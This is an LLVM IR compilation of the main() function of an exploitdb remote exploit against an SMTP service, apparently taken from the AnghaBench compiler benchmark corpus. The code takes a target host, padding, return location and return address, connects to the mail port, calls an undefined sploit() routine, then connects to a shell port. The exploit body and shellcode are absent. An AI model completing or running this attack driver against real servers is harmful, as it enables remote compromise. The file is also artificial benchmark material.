; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_900.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_900.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [55 x i8] c"Usage: %s < host > < padding > < retloc > < retaddr >\0A\00", align 1
@.str.1 = private unnamed_addr constant [21 x i8] c"--{ Smack 1.oohaah\0A\0A\00", align 1
@SMTP_PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [126 x i8] c"--{ definitely, adv.:\0A--{ 1. Having distinct limits\0A--{ 2. Indisputable; certain\0A--{ 3. Clearly defined; explicitly precise\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [57 x i8] c"--{ Attempting to redefine the meaning of 'definitely'\0A\0A\00", align 1
@SHELL_PORT = common dso_local global i32 0, align 4
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i8* null, i8** %10, align 8
  %11 = load i32, i32* %4, align 4
  %12 = load i8**, i8*** %5, align 8
  %13 = call i64 @parse_args(i32 %11, i8** %12, i8** %10, i32* %7, i32* %8, i32* %9)
  %14 = icmp ne i64 %13, 0
  br i1 %14, label %15, label %20

15:                                               ; preds = %2
  %16 = load i8**, i8*** %5, align 8
  %17 = getelementptr inbounds i8*, i8** %16, i64 0
  %18 = load i8*, i8** %17, align 8
  %19 = call i32 @bye(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str, i64 0, i64 0), i8* %18)
  br label %20

20:                                               ; preds = %15, %2
  %21 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  %22 = load i8*, i8** %10, align 8
  %23 = load i32, i32* @SMTP_PORT, align 4
  %24 = call i32 @conn(i8* %22, i32 %23)
  store i32 %24, i32* %6, align 4
  %25 = call i32 @printf(i8* getelementptr inbounds ([126 x i8], [126 x i8]* @.str.2, i64 0, i64 0))
  %26 = load i32, i32* %6, align 4
  %27 = load i32, i32* %7, align 4
  %28 = load i32, i32* %8, align 4
  %29 = load i32, i32* %9, align 4
  %30 = call i32 @sploit(i32 %26, i32 %27, i32 %28, i32 %29)
  %31 = call i32 @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.3, i64 0, i64 0))
  %32 = load i8*, i8** %10, align 8
  %33 = load i32, i32* @SHELL_PORT, align 4
  %34 = call i32 @shell(i8* %32, i32 %33)
  %35 = load i32, i32* @EXIT_SUCCESS, align 4
  ret i32 %35
}

declare dso_local i64 @parse_args(i32, i8**, i8**, i32*, i32*, i32*) #1

declare dso_local i32 @bye(i8*, i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @conn(i8*, i32) #1

declare dso_local i32 @sploit(i32, i32, i32, i32) #1

declare dso_local i32 @shell(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
